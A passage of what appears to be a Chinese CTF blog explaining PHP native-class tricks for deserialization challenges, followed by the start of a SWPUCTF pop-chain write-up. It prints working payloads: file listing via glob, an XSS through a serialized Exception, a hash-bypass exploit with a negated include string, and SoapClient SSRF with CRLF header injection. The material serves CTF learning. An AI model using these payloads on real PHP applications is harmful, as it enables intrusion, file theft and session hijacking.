class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>下面看一下ctfshow的web74</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>这个当中由于<code>error_reporting(0);</code><br><code>ini_set(&#39;display_errors&#39;, 0);</code>  </p><p>这两行代码禁用了php错误报告，并且禁止在浏览器中显示错误信息，这意味着，没法看到执行结果</p><p>所以可以用到glod:///来进行一个读取文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>然后就可以看到文件名，最后文件包含你想要的文件即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>假设flag.txt是在根目录的</p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</p><p>这个是FilesystemIterator的子类  然后也可以去读取文件名 但是它的行为和glob()差不多，所以在传参的时候就不需要用glob伪协议了</p><p>下面是这个代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下图所示：<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629890.png" alt="image-20230624201553453"></p><p>也是绝对路径</p><p><strong>下面就是读取文件内容的类了</strong></p><h3 id="SPIFileInfo"><a href="#SPIFileInfo" class="headerlink" title="SPIFileInfo"></a>SPIFileInfo</h3><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)</p><p>SPIFileInfo类为单个文件的信息提供了高级的面向对象接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下图所示：<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630756.png" alt="image-20230624210000481"></p><p>如果出现以下类似的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br><span class="hljs-class">   &#125;</span><br><span class="hljs-class">这个<span class="hljs-title">class</span>就是那些类，然后<span class="hljs-title">data</span>就是那些命令</span><br></code></pre></td></tr></table></figure><h2 id="2-构造xss"><a href="#2-构造xss" class="headerlink" title="2.构造xss"></a>2.构造xss</h2><p>有两个类 </p><p>1.Error 2.Exception</p><p>这两个类当中都有_toString这两个魔术方法</p><p>1.Error(在php7,8开启的时候开启报错)  <strong>Error</strong> 是所有PHP内部错误类的基类。</p><p>2.Exception(在php5,7,8开启的时候开启报错)   <strong>Exception</strong>是所有用户级异常的基类。</p><p>通过echo(不只是echo 当对象被当成字符串时就能触发)来触发toString 进一步构造xss</p><p>通过官方文档可以看到这两个类的属性都一样</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630767.png" alt="image-20230628154427087"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630782.png" alt="image-20230628154442643"></p><p>下面可以演示一下进行xss构造</p><p>先写一个经过反序列化后的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的echo是触发的关键</p><p>然后下面是构造xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;U_F1ind_Me&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为有不可见字符，所以要url编码一下</p><p>需要注意的就是只有Exception才能在php5进行一个xss</p><p>Error只有在7或8下进行一个xss</p><h2 id="3-绕过哈希比较"><a href="#3-绕过哈希比较" class="headerlink" title="3.绕过哈希比较"></a>3.绕过哈希比较</h2><p>这个是利用了Error的报错信息 </p><p>可以用一些代码来说明一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个的运行结果是:<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630647.png" alt="image-20230628195433399" style="zoom:80%;" /></p><p>两个new Error的类都在同一行 报错信息也是同一行，虽然两个的内容不一样 但是报错信息一样 这样在面对一些哈希比较的时候就可以进行绕过</p><p>下面来一个题目看看:</p><p><strong>[极客大挑战 2020]Greatphp</strong></p><p>进入后查看一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们要做的就是执行eval命令</p><p>这个前提就是  if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )  先满足这个if语句 这个我们之前做的MD5碰撞就不能用了 可以用Error报错信息进行一个哈希绕过</p><p>就是让两个Error语句在同一行 然后和之前的没什么区别了</p><p>这个有一个正则匹配 过滤了小括号和双引号 我们用取反进行一个绕过</p><p><code>$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code></p><p>主要的就是上面的那个</p><p>最终构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span>-&gt;syc=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4.SSRF"></a>4.SSRF</h2><p>这个和SoapClient这个类有关</p><p>这个类里面有一个call魔术方法  当调用不存在的方法时被调用</p><p>注意要开启soap选项 否则不会监听成功</p><p>PHP的内置类SoaPClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的php客户端。</p><p>函数的形式如下：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><p>第一个参数为指明是否为wsdl模式，为null则为非wsdl模式</p><p>wsdl就是一个xml格式的文档，用于描述web server的定义</p><p>第二个参数为array,wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送的soap服务器的url，uri是服务的命名空间</p><p>下面可以看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.122.136:2022/&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&quot;qaq\r\nCookie: PHPSESSID=wangluoanquanqaq1213&quot;</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630388.png" alt="image-20230629151043313"></p><p>这个soapaction的内容是我们可以控制的</p><p>其实也就是uri的内容</p><p>然后这里的话可以与CRLF进行一个结合 进行CRLF攻击(就是利用了\r\n)</p><p>可以参考这篇文章:<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><p>可以结合CRLF进行xss =&gt; HRS</p><p>这个SoapCliet原生类我感觉就是结合CRLF进行一个http的一些修改</p><p>可以举一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.122.136:2022/&#x27;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&#x27;data=ki10Moc&#x27;</span>;   <span class="hljs-comment">//这个就是一个post传参 data为参数 里面的内容为值</span><br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958&#x27;</span><br>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Happy^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;ki10Moc&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码修改了Xff头 cookie的值以及UA头的内容</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化的ctf题目</title>
    <link href="/2023/11/15/%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/11/15/%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>这一道题我看了好一会wp才想明白，还是太菜鸡了，下面整理一下思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>我们观察php代码可以，要想获得flag，有一个 function Getflag()函数，我们需要调用这个函数。</p><p>然后在w33m这个类中看到有一个函数调用的。</p><p>即：$this-&gt;w00m-&gt;{$this-&gt;w22m}();  